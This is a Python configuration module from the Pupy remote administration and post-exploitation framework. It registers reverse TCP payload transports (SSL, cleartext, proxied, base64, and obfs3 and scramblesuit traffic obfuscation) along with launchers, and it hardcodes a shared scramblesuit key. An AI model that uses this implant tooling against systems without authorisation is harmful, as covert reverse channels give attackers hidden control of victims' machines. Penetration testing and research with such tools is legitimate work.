# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import os
import logging
from .servers import PupyTCPServer
from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient
from .transports import dummy, b64
from .transports.obfs3 import obfs3
try:
	from .transports.scramblesuit import scramblesuit
except ImportError as e:
	#to make pupy works even without scramblesuit dependencies
	logging.warning("%s. The transport has been disabled."%e)
	scramblesuit=None
from .streams import PupySocketStream
from .launchers.simple import SimpleLauncher
from .launchers.auto_proxy import AutoProxyLauncher
try:
	import ConfigParser as configparser
except ImportError:
	import configparser
from rpyc.utils.authenticators import SSLAuthenticator

ssl_auth=None

def ssl_authenticator():
	config = configparser.ConfigParser()
	config.read("pupy.conf")
	return SSLAuthenticator(config.get("pupyd","keyfile").replace("\\",os.sep).replace("/",os.sep), config.get("pupyd","certfile").replace("\\",os.sep).replace("/",os.sep), ciphers="SHA256+AES256:SHA1+AES256:@STRENGTH")

#scramblesuit password must be 20 char long
scramblesuit_passwd="th!s_iS_pupy_sct_k3y"

transports={}
launchers={}

transports["tcp_ssl"]={
		"info" : "Simple reverse TCP payload with SSL",
		"server" : PupyTCPServer,
		"client": PupySSLClient,
		"client_kwargs" : {},
		"authenticator" : ssl_authenticator,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_ssl_proxy"]={
		"info" : "Simple reverse TCP payload with SSL passing through a SOCKS4/SOCKS5/HTTP proxy",
		"server" : PupyTCPServer,
		"client": PupyProxifiedSSLClient,
		"client_kwargs" : {'proxy_addr': None, 'proxy_port': None, 'proxy_type':'HTTP'},
		"authenticator" : ssl_authenticator,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_cleartext"]={
		"info" : "Simple reverse TCP payload (cleartext)",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_cleartext_proxy"]={
		"info" : "Simple reverse TCP payload in cleartext passing through a SOCKS4/SOCKS5/HTTP proxy",
		"server" : PupyTCPServer,
		"client": PupyProxifiedTCPClient,
		"client_kwargs" : {'proxy_addr':'127.0.0.1', 'proxy_port':8080, 'proxy_type':'HTTP'},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : dummy.DummyPupyTransport,
		"server_transport" : dummy.DummyPupyTransport,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["tcp_base64"]={
		"info" : "Reverse TCP payload with base64 encoding",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : b64.B64Client,
		"server_transport" : b64.B64Server,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
transports["obfs3"]={
		"info" : "Reverse TCP Payload using obfs3 transport",
		"server" : PupyTCPServer,
		"client": PupyTCPClient,
		"client_kwargs" : {},
		"authenticator" : None,
		"stream": PupySocketStream ,
		"client_transport" : obfs3.Obfs3Client,
		"server_transport" : obfs3.Obfs3Server,
		"client_transport_kwargs": {},
		"server_transport_kwargs": {},
	}
if scramblesuit:
	transports["scramblesuit"]={
			"info" : "Reverse TCP Payload using scramblesuit transport",
			"server" : PupyTCPServer,
			"client": PupyTCPClient,
			"client_kwargs" : {},
			"authenticator" : None,
			"stream": PupySocketStream ,
			"client_transport" : scramblesuit.ScrambleSuitClient,
			"server_transport" : scramblesuit.ScrambleSuitServer,
			"client_transport_kwargs": {"password":scramblesuit_passwd}, 
			"server_transport_kwargs": {"password":scramblesuit_passwd},
		}

launchers["simple"]=SimpleLauncher
launchers["auto_proxy"]=AutoProxyLauncher

